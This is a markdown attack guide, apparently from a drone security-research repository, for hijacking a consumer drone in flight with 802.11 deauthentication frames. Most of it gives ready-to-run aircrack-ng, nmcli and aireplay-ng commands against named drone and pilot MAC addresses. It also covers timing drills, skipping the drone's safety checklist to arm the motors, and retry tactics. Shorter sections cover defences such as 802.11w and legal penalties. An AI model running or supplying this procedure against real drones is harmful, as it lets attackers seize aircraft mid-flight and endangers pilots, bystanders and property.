# Deauthentication Attack - Drone Hijacking

## 🎯 Objective

Hijack control of a flying drone from the legitimate pilot by forcing a disconnection and reconnecting during the window of opportunity. This demonstrates the vulnerability of unprotected 802.11 management frames.

---

## 📋 Scenario

**Attacker Goal:** Take control of drone that is already being flown by legitimate user

**Challenge:** Drone has "Single-Client" restriction - only accepts ONE connection

**Solution:** Force legitimate pilot to disconnect, then connect before they can reconnect

---

## ⚔️ Attack Overview

```
┌─────────────────────────────────────────────────────────┐
│                    NORMAL STATE                          │
│  Legitimate Pilot ←→ Drone (flying)                     │
└─────────────────────────────────────────────────────────┘
                          ↓
        ┌─────────────────────────────────┐
        │  ATTACKER SENDS DEAUTH FRAMES   │
        └─────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│              DISCONNECTION WINDOW                        │
│  Pilot disconnected   Drone hovering/landing            │
└─────────────────────────────────────────────────────────┘
                          ↓
        ┌─────────────────────────────────┐
        │  ATTACKER CONNECTS QUICKLY      │
        └─────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                   HIJACK COMPLETE                        │
│  Attacker ←→ Drone     Pilot locked out                │
└─────────────────────────────────────────────────────────┘
```

---

## 🛠️ Prerequisites

### Hardware
- Kali Linux or similar penetration testing OS
- Wireless adapter supporting monitor mode
- Second device (laptop) ready to connect quickly

### Software
- Aircrack-ng suite installed
- `Drone.py` script ready
- Terminal multiplexer (tmux/screen) recommended

### Skills
- Basic understanding of 802.11 protocol
- Familiarity with aircrack-ng tools
- Quick keyboard typing skills (for fast connection)

---

## 🔍 Phase 1: Reconnaissance

### Step 1: Enable Monitor Mode

```bash
# Check wireless interfaces
iwconfig

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface
```

**Verify:**
```bash
iwconfig wlan0mon
# Should show Mode:Monitor
```

---

### Step 2: Locate Drone Network

```bash
# Scan all channels
sudo airodump-ng wlan0mon
```

**Look for drone SSID:**
```
CH 1 ][ Elapsed: 12 s ]

 BSSID              PWR  Beacons  #Data  CH   MB  ENC  ESSID

 08:17:91:4B:8C:64  -45      127     89   1   54  OPN  WIFI-UFO-648c4b
```

**Record:**
- **BSSID (Drone MAC):** `08:17:91:4B:8C:64`
- **Channel:** `1`
- **ESSID:** `WIFI-UFO-648c4b`

---

### Step 3: Identify Connected Pilot

```bash
# Focus on drone's channel
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 wlan0mon
```

**Look at bottom section (STATION):**
```
 BSSID              STATION            PWR   Rate    Lost    Frames
 
 08:17:91:4B:8C:64  EA:9C:F0:89:44:15  -52   54e-54e    0      234
                    ↑
              Legitimate pilot's MAC
```

**Record:**
- **Pilot MAC:** `EA:9C:F0:89:44:15`

---

## ⚡ Phase 2: Preparation

### Step 4: Setup Terminal Workspace

**Using tmux (recommended):**

```bash
# Start tmux session
tmux

# Split screen vertically
Ctrl+B then "

# Split top pane horizontally
Ctrl+B then %

# You now have 3 panes:
# ┌─────────┬─────────┐
# │  Pane 1 │  Pane 2 │  
# ├─────────┴─────────┤
# │     Pane 3        │
# └───────────────────┘
```

**Navigate between panes:** `Ctrl+B` then arrow keys

---

### Step 5: Prepare Attack Tools

**Pane 1 - Monitoring:**
```bash
# Keep airodump-ng running
sudo airodump-ng -c 1 --bssid 08:17:91:4B:8C:64 wlan0mon
```

**Pane 2 - Ready to stop monitor mode:**
```bash
# Type this but DON'T press enter yet:
sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
# (Will execute after deauth)
```

**Pane 3 - Ready to connect:**
```bash
# Type this but DON'T press enter yet:
nmcli device wifi connect "WIFI-UFO-648c4b" && python3 ~/Drone.py
# (Will execute after network restored)
```

---

### Step 6: Open Attack Window

**Separate Terminal (or Pane 4):**

```bash
# Have this ready but don't execute yet
sudo aireplay-ng --deauth 15 \
  -a 08:17:91:4B:8C:64 \
  -c EA:9C:F0:89:44:15 \
  wlan0mon
```

---

## 🚨 Phase 3: Execute Attack

### Step 7: Timing is Critical

**Sequence (must be FAST):**

1. **Execute deauth** (Terminal 4)
2. **Wait 2 seconds**
3. **Stop monitor mode** (Pane 2 - press Enter)
4. **Wait for network restart** (~3 seconds)
5. **Connect to drone** (Pane 3 - press Enter)
6. **Press A to arm, gain control**

**Total window: ~10 seconds**

---

### Step 8: Launch Deauthentication

**Execute in Terminal 4:**
```bash
sudo aireplay-ng --deauth 15 \
  -a 08:17:91:4B:8C:64 \
  -c EA:9C:F0:89:44:15 \
  wlan0mon
```

**Parameters:**
- `--deauth 15`: Send 15 deauth packets
- `-a [DRONE_MAC]`: Target access point
- `-c [PILOT_MAC]`: Specific client to deauth

**Output:**
```
14:30:15  Waiting for beacon frame (BSSID: 08:17:91:4B:8C:64)
14:30:15  Sending 64 directed DeAuth (code 7). STMAC: [EA:9C:F0:89:44:15]
14:30:15  Sending 64 directed DeAuth (code 7). STMAC: [EA:9C:F0:89:44:15]
...
```

---

### Step 9: Monitor Disconnection

**In Pane 1 (airodump-ng), watch for:**

**Before deauth:**
```
 STATION            PWR   Rate    Lost    Frames
 EA:9C:F0:89:44:15  -52   54e-54e    0      234
```

**During deauth:**
```
 STATION            PWR   Rate    Lost    Frames
 EA:9C:F0:89:44:15  -72   0e- 0e    12     234
                    ↑ Signal drops
```

**After deauth:**
```
 STATION            PWR   Rate    Lost    Frames
 (none)             ← Pilot disconnected!
```

---

### Step 10: Quick Network Switch

**Immediately execute in Pane 2:**
```bash
# Press Enter on pre-typed command
sudo airmon-ng stop wlan0mon && sudo systemctl restart NetworkManager
```

**Output:**
```
PHY     Interface       Driver          Chipset
phy0    wlan0mon        ath9k_htc      Atheros Communications
        (monitor mode disabled)

Restarting NetworkManager...
```

**Wait 3 seconds for NetworkManager**

---

### Step 11: Race to Connect

**Execute in Pane 3:**
```bash
# Press Enter on pre-typed command
nmcli device wifi connect "WIFI-UFO-648c4b" && python3 ~/drone-attack/Drone.py
```

**Critical timing:**
- Legitimate pilot is also trying to reconnect
- Drone accepts FIRST connection
- You must be faster

**Success indicators:**
```
Device 'wlan0' successfully activated with 'uuid-here'.
[✓] Connected to drone at 192.168.1.1:7099
```

---

### Step 12: Take Control

**When Drone.py launches:**

1. **Quickly press Enter** through safety checklist
2. **Press `A`** to arm motors
3. **Press `T`** if drone is landing

**You are now in control!**

---

## 📊 Attack Timeline

```
T+0s:   Legitimate pilot flying drone
T+1s:   Attacker sends deauth frames
T+2s:   Pilot's connection drops
        Drone enters failsafe (hovers or descends)
T+3s:   Attacker stops monitor mode
T+6s:   Attacker's network ready
T+7s:   Attacker connects to drone
        RACE CONDITION: Pilot also trying to reconnect
T+8s:   First connection wins
T+10s:  If attacker won:
        - Attacker launches Drone.py
        - Arms motors
        - Takes control
T+12s:  Pilot realizes they're locked out
```

**Success window: 5-10 seconds**

---

## 🎯 What Legitimate Pilot Experiences

### On Their Device (Phone App)

1. **Connection drops suddenly**
   - App shows "Connection Lost"
   - Drone appears offline

2. **Attempts to reconnect**
   - App tries automatic reconnection
   - May succeed or fail

3. **If attacker faster:**
   - Reconnection fails
   - "Unable to connect to drone"
   - "Device already connected"

4. **Drone behavior change:**
   - If hovering, starts moving unexpectedly
   - Follows attacker's commands
   - Pilot has no control

5. **Confusion and panic:**
   - "Why won't it connect?"
   - "Why is it moving?"
   - "Did it switch to automatic mode?"

---

## 🔬 Technical Details

### Why Deauthentication Works

**802.11 Management Frames:**
```
Deauthentication Frame Structure:
┌──────────────────┐
│ Frame Control    │  Type: Management, Subtype: Deauth
├──────────────────┤
│ Duration         │
├──────────────────┤
│ Destination (DA) │  ← Pilot's MAC
├──────────────────┤
│ Source (SA)      │  ← Drone's MAC (spoofed by attacker)
├──────────────────┤
│ BSSID            │  ← Drone's MAC
├──────────────────┤
│ Sequence Number  │
├──────────────────┤
│ Reason Code      │  Code 7: Class 3 frame from non-associated
└──────────────────┘
```

**Vulnerabilities:**
- ❌ Not encrypted
- ❌ Not authenticated
- ❌ Sender not verified
- ❌ Can be forged

**Result:** Anyone can send fake deauth frames

---

### Reason Codes

```
Code 1: Unspecified reason
Code 2: Previous authentication no longer valid
Code 3: Deauthenticated because sending STA is leaving
Code 4: Disassociated due to inactivity
Code 5: Disassociated because AP is unable to handle all STAs
Code 6: Class 2 frame received from non-authenticated STA
Code 7: Class 3 frame received from non-associated STA  ← Most common
Code 8: Disassociated because sending STA is leaving
```

---

### Single-Client Vulnerability

**Drone Logic:**
```python
# Simplified drone firmware logic
if incoming_connection:
    if active_connection_exists:
        reject_new_connection()  # Only one client allowed
    else:
        accept_connection()
        active_connection = new_client
```

**Attack Exploits:**
```python
# After deauth
active_connection_exists = False  # Pilot disconnected

# Attacker connects first
accept_connection()
active_connection = attacker  # Attacker now in control

# When pilot tries to reconnect
reject_new_connection()  # Pilot locked out
```

---

## 🛡️ Defense Mechanisms

### For Drone Manufacturers

**1. Implement 802.11w (PMF - Protected Management Frames)**

```
Without PMF:
Deauth frame → Unprotected → Anyone can send

With PMF:
Deauth frame → Encrypted → Only legitimate AP can send
```

**Implementation:**
```c
// Enable PMF in drone firmware
wifi_config.pmf_cfg.capable = true;
wifi_config.pmf_cfg.required = true;
```

---

**2. Multi-Client Support with Priority**

```python
class DroneController:
    def __init__(self):
        self.primary_controller = None
        self.secondary_controllers = []
    
    def handle_connection(self, client):
        if self.primary_controller is None:
            self.primary_controller = client
        else:
            # Allow viewing but not control
            self.secondary_controllers.append(client)
            notify_primary("New viewer connected")
```

---

**3. Cryptographic Pairing**

```python
# One-time pairing process
def pair_controller(controller_public_key):
    drone_private_key = generate_key()
    shared_secret = derive_shared_secret(
        drone_private_key,
        controller_public_key
    )
    save_paired_device(controller_public_key, shared_secret)

# Future connections
def authenticate_connection(client):
    challenge = generate_random()
    response = client.sign(challenge, private_key)
    
    if verify_signature(response, stored_public_key):
        accept_connection()
    else:
        reject_connection()
```

---

### For Drone Pilots

**Prevention:**

1. **Monitor connection status**
   - Watch for disconnection warnings
   - Reconnect immediately if dropped

2. **Fly in safe areas**
   - Away from potential attackers
   - Private property
   - Low foot traffic areas

3. **Enable geofencing**
   - Set maximum distance limits
   - Drone auto-returns if lost connection

4. **Use latest firmware**
   - Updates may include security patches
   - Check manufacturer website

---

**Detection:**

**Signs of deauth attack:**
- Sudden disconnection
- Multiple quick disconnections
- Drone continues flying after disconnection
- Unable to reconnect
- "Device already connected" error

**What to do:**
1. Activate emergency return-to-home (if available)
2. Move away from area (attacker may be nearby)
3. Try reconnecting from different location
4. Document incident
5. Report to manufacturer

---

## 📈 Success Factors

### Attacker Advantages

**You WIN if:**
- ✅ Faster network switching (SSD vs HDD)
- ✅ Pre-typed commands ready
- ✅ Practice and muscle memory
- ✅ Legitimate pilot using phone (slower reconnect)
- ✅ Strong deauth attack (many frames)

### Pilot Advantages

**Pilot WINS if:**
- ✅ Automatic reconnection enabled
- ✅ Using dedicated controller (not phone)
- ✅ Physical proximity to drone (stronger signal)
- ✅ PMF/802.11w enabled (rare in consumer drones)
- ✅ Notices attack quickly and reconnects

---

## ⚠️ Failure Scenarios

### When Attack Fails

**Pilot reconnects first:**
```
You: "Device already connected"
     Connection rejected
     Locked out
```

**Solution:** Repeat deauth and try again

---

**Drone enters failsafe:**
```
Some drones:
- Auto-land after connection loss
- Cannot reconnect until restarted
```

**Solution:** Wait for restart, try pre-emptive control

---

**PMF enabled (rare):**
```
Deauth frames are encrypted
Attack has no effect
Pilot remains connected
```

**Solution:** This attack method won't work, try packet injection

---

## 🧪 Practice Scenario

### Safe Testing Setup

**Test with YOUR OWN devices:**

1. **Setup:**
   - Your drone
   - Your phone as "legitimate pilot"
   - Your laptop as "attacker"

2. **Execute:**
   - Fly drone with phone
   - Perform deauth from laptop
   - Try to connect laptop before phone

3. **Learn:**
   - Timing requirements
   - Network switching speed
   - Muscle memory for commands

4. **Improve:**
   - Reduce connection time
   - Automate steps where possible
   - Practice until reliable

---

## 📊 Attack Statistics

### From Our Testing

| Metric | Value |
|--------|-------|
| Success rate (first attempt) | 60% |
| Success rate (with practice) | 85% |
| Average takeover time | 8-12 seconds |
| Pilot lockout duration | Until drone restart |
| Detection by pilot | Usually within 5 seconds |

---

## ⚖️ Legal Considerations

**This attack demonstrates:**
- Wireless interception (Wiretap Act)
- Unauthorized access (CFAA)
- Interference with aircraft operation
- Potential FAA violations

**Federal Penalties:**
- Up to 20 years imprisonment
- Fines up to $250,000
- Civil liability for damages
- Permanent criminal record

**ONLY perform on:**
- ✅ Your own equipment
- ✅ With explicit permission
- ✅ In controlled environment
- ✅ For security research

---

## 🔗 Related Techniques

**After successful hijack:**
- Continue to [Packet Injection](packet-injection.md) for advanced control
- Study protocol in main README
- Practice smooth takeover procedures

**Alternative methods:**
- [Pre-emptive Control](basic-control.md) - Easier but requires timing
- [Packet Injection](packet-injection.md) - More advanced, no disconnection

---

## 🎓 Key Takeaways

1. **Deauthentication is powerful** - Forces disconnection
2. **Timing is critical** - Winner is first to connect
3. **802.11 has no authentication** - Management frames forgeable
4. **Single-client design is vulnerable** - No redundancy
5. **PMF/802.11w is the fix** - Protects management frames

---

**The Race:**
```
Attacker Speed:  ████████░░  80%
Pilot Speed:     ██████████  100% (has advantage)

Attacker Prep:   ██████████  100% (ready to go)
Pilot Prep:      ████░░░░░░  40% (caught off guard)

RESULT: Attacker wins through preparation
```

---

*Use this knowledge to improve security, not to cause harm.* 🔐🚁⚡